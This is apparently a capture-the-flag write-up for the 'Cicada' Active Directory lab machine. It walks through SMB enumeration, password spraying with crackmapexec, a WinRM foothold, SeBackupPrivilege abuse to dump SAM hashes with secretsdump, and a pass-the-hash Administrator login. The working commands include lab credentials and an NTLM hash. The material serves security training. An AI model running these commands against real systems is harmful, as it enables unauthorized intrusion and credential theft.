# CICADA

## Topics will be covered
   - Active Directory Enumeration and Privilege Escalation
   - Password Spraying
   - SeBackup Privilege Abuse
   - Pass-the-Hash Attack

## Enumeration and Exploitation tools :
- Nmap
- SMB
- Lookupsid
- Password Spraying 
- Enumerating Domain Users 
- Foothold
- Privilege Escalation 


### Nmap
--------------------------------------------------------------------------------
```bash
nmap -sV -Pn 10.10.11.35
```
Findings
- Kerberos (port 88)
- LDAP/S (ports 389, 636, 3268, 3269)
- Domain: cicada.htb
- Host: CICADA-DC.cicada.htb

** Note: As there is no web interface, the first thing we can check is the SMB shares.

### SMB shares
-----------------------------------------------------------------------------------------
```bash
crackmapexec - a popular tool to automate enumerating domains (including users, files/ directories, and shares)
```
![alt text](image.png)
Note : if we specify any user the results would be much more better
Lets take guest as user and no password.
```bash
crackmapexec smb cicada.htb -u 'guest' -p '' --shares
```
![alt text](image-1.png)
- We can see HR share and IPC$ shares are able to read by guest user.
--------------------------------------------------------------------------------------------------------------------
### Smbclient
```bash
smbclient  //cicada.htb/HR
```
![alt text](image-2.png)
- Let's get the notice from HR.txt to kali
![alt text](image-3.png)
- And lets try reading what's inside the note---it seems we have default password for 1st time login 
![alt text](image-4.png)

----------------------------------------------------------------------------------------------------------------------
### Impackets - Impacket is an open-source toolkit
- Common Attacks & Exploits

|Use Case      |Tool/Script     |Description|
| :---         |     :---:      | :--- |
|Pass-the-Hash (PtH)|psexec.py, wmiexec.py|Executes commands using NTLM hashes.|
|Pass-the-Ticket (PtT)|ticketConverter.py|Uses Kerberos tickets for lateral movement.|
|SMB Relay Attack|ntlmrelayx.py|Relays NTLM auth to other machines.|
|DCSync Attack|secretsdump.py|Extracts password hashes from Active Directory.|
|Golden Ticket Attack|ticketer.py|Forges Kerberos tickets for persistence.|
|lookupsid|impacket-lookupsid|To get the user|

### Post-Exploitation & Enumeration

| Tool          | Purpose                                   |
|---------------|-------------------------------------------|
| GetADUsers.py | Dumps AD user info via LDAP.             |
|smbclient.py   | Interacts with SMB shares (like smbclient).|
| smbmap.py     | Enumerates SMB shares and permissions.    |  
| mssqlclient.py | Executes SQL queries on MSSQL servers. |
| rpcdump.py     | Lists RPC endpoints on a target.         |

- Now lets try lookupsids from impackets with "guest" and "-no-passs" with (Attempts authentication without a password (null session).)
```bash
impacket-lookupsid 'cicada.htb/guest'@cicada.htb -no-pass 
```
![alt text](image-5.png)
- we find groups, users, and aliases within the domain

- To view SID's 
```bash
In cmd - wmic useraccount get name,sid
In power shell - Get-ADUser -Identity "Username" | Select-Object SID
In impackets lookupsid - impacket-lookupsid 'DOMAIN/user'@TARGET_IP
```
### Common Well-Known SIDs
- Windows has built-in SIDs for default accounts and groups:

| Tool          | Purpose                                   |Purpose                                   |
|---------------|-------------------------------------------|-------------------------------------------|
| S-1-5-21-domain-500 |Administrator   |Built-in admin account.|
| S-1-5-21-domain-501 |Guest          |Built-in guest account.|  
| S-1-5-21-domain-502 |Krbtgt         |Kerberos key distribution center (KDC).|
| S-1-5-21-domain-512 |Domain Admins  |Group of all domain administrators.      |
|S-1-5-21-domain-513|Domain  Users|Group of all authenticated users.|
|S-1-5-18|Local System|Built-in system account with high privileges.|
|S-1-5-32-544|Administrators|Local administrators group.|

- Coming back to our ad  - since we want a list of the users only we will separate them with small alteration as below

```bash
sed 's/.*\\\(.*\) (SidTypeUser)/\1/' 
.*\\: Matches everything up to and including the backslash (domain)
\(.*\): Captures the username (saved in group \1)
(SidTypeUser): Matches the trailing identifier
\1: Replaces entire line with just the captured username
```
- So the final command is
```bash
 impacket-lookupsid 'cicada.htb/guest'@cicada.htb -no-pass | grep 'SidTypeUser' | sed 's/.*\\\(.*\) (SidTypeUser)/\1/'
```
![alt text](image-6.png)

- Now lets create a user list text file and then using this and lets try the password-spray attack
### Password Spraying
---------------------------------------------------------------------------------------------------------------------------------------
- For password spraying we choosing crackmapexec only
```bash
crackmapexec smb cicada.htb -u user.txt -p 'Cicada$M6Corpb*@Lp#nZp!8'
```
![alt text](image-7.png)
- We can observe that the user michael is still using the old default password given by the AD
- Let's try login with the it 
![alt text](image-8.png)
- Since we don't have access to any of other servers a michel.wrightson user lets try to find the other users smb-shares with this user as below
```bash
crackmapexec smb cicada.htb -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' -- users 
```
![alt text](image-9.png)
- This should give us the user descriptions data stored during the user creation. This might be not be empty sometimes.
### Foothold
----------------------------------------------------------------------------------
- Lets check whether we have share access with David user
```bash
crackmapexec smb cicada.htb -u david.orelious -p 'aRt$Lp#7t*VQ!3' --shares 
```
![alt text](image-10.png)
- Good david have the more shares  permission than guest user.
- Now lets try to connect using smbclient  to see all the share first lets try with DEV share
```bash
smbclient //cicada.htb/DEV -U 'david.orelious%aRt$Lp#7t*VQ!3'
```
![alt text](image-11.png)
- He is having a powershell script
![alt text](image-12.png)
- lets try to open it and we can see the pssword got converted into power shell string 
- lets try to decrypt the string using the poweshell in kali,
![alt text](image-13.png)
- It seems not working, lets try another method

### Evil-WinRm
------------------------------------------------------------------------------------------------------------------------------------------------------------------------
- Execute PowerShell commands.
- Upload/download files.
- Load in-memory PowerShell modules (like Mimikatz).
- Requirements:
WinRM must be enabled on the target.
```bash
evil-winrm -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt' -i cicada.htb 
```
![alt text](image-14.png)
- We've successfully gotten a WinRM session

### Privilege Escalation
------------------------------------------------------------------------------------------------------------------------------------------------------------------------
- Lets try some windows commands and see the permission
```bash
whoami /priv -  which will give you the Privilege Name  and its state (enables/disables)
```
- Some of the most important privilages 
| Privilege Name | Description |
|----------------|-------------|
|SeImpersonatePrivilege|Potato attacks (JuicyPotato, PrintSpoofer) → SYSTEM access|
|SeAssignPrimaryTokenPrivilege| Token manipulation attacks|
|SeBackupPrivilege| Backup and restore files, folders, and registry keys(Read sensitive files (e.g., SAM, registry))|
|SeRestorePrivilege| Restore files, folders, and registry keys (Write sensitive files (e.g., SAM, registry))|
|SeDebugPrivilege|Inject into processes (Mimikatz, dumping LSASS)|
|SeLoadDriverPrivilege|Load and unload device drivers(Load malicious kernel drivers)|
|SeTakeOwnershipPrivilege|Take ownership of files, folders, and registry keys (Change permissions on sensitive files)|

![alt text](image-15.png)


- We can see SeBackupPrivilege - This privilege was designed to facilitate system backups and it enables access to system-protected files.
- user having this permission can able to access the SYSTEM and SAM Windows Registry Hives, through which we can have the escalation.
- Now lets try to copy the both sam and system registries to the current location using cmd 
```bash
reg save hklm\sam sam
reg save hklm\system system
download sam ----> which will downlode to kali
download system----> 
```
### Impacket's secretsdump 
--------------------------------------------------------------------------------------------------------------------------------------------------------------------
- Now since we got the sam and system mail regestry as files.
- Lets do the dumping process where the impackets will dump the user NTLM hashes.
![alt text](image-16.png)
```bash
impacket-secretsdump -sam sam -system system local 
```
- Note:  local - Indicates that the files are stored locally (not a live system).
![alt text](image-17.png)
- We can use it to directly log in to the account with Evil-WinRM by passing it as a parameter with -H

```bash
evil-winrm -u Administrator -H 2b87e7c93a3e8a0ea4a581937016f341 -i cicada.htb 
```
![alt text](image-18.png)
